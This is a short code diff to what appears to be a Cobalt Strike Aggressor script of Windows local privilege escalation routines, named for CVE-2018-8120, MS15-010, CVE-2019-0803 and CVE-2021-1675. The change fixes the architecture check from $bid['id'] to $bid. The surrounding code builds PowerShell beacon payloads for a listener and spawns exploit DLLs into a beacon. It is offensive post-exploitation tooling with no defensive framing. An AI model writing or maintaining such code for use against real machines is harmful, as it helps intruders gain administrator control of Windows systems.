@@ -179,7 +179,7 @@ sub MS14_068{
 sub CVE_2018_8120{
     local('$Rch $payload');
     $Rch = "x86";
-    if (-is64 $bid['id']) {
+    if (-is64 $bid) {
         $Rch = "x64";
     }
     $payload = powershell($3['listener'], false, $Rch);
@@ -194,7 +194,7 @@ sub CVE_2018_8120{
 
 sub MS15_010{
     $Rch = "x86";
-    if (-is64 $bid['id']) {
+    if (-is64 $bid) {
         $Rch = "x64";
     }
     $payload = powershell($3['listener'], false, $Rch);
@@ -222,7 +222,7 @@ sub MS15_015{
 
 sub CVE_2019_0803{
     $Rch = "x86";
-    if (-is64 $bid['id']) {
+    if (-is64 $bid) {
         $Rch = "x64";
     }
     $payload = powershell($3['listener'], false, $Rch);
@@ -235,7 +235,7 @@ sub CVE_2019_0803{
     }
 
 sub CVE_2021_1675 {
-    if (-is64 $bid['id']){
+    if (-is64 $bid){
         $arch = "x64";
         $dll = getFileProper(script_resource("bin/Privilege_escalation/CVE_2021_1675/"), "CVE-2021-1675.x64.dll");
         bdllspawn($bid, $dll, $3['beacondllfile'], "Local Privilege Escalation of CVE-2021-1675 x64", 5000, true);
